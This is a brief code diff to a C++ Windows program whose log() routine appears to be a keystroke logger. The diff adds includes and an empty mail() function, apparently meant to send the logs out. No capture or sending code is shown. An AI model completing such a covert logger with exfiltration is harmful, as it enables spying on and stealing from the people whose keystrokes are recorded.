@@ -1,7 +1,10 @@
 #include <iostream>
 #include <windows.h>
 #include <Winuser.h>
+#include <windowsx.h>
 #include <fstream>
+#include <time.h>
+
 using namespace std;
 
 void log();
@@ -9,6 +12,7 @@ void log();
 int main()
 {
     log();
+    mail();
     return 0;
 }
 
@@ -138,4 +142,8 @@ void log(){
             }
         }
     }
+}
+
+void mail(){
+
 }
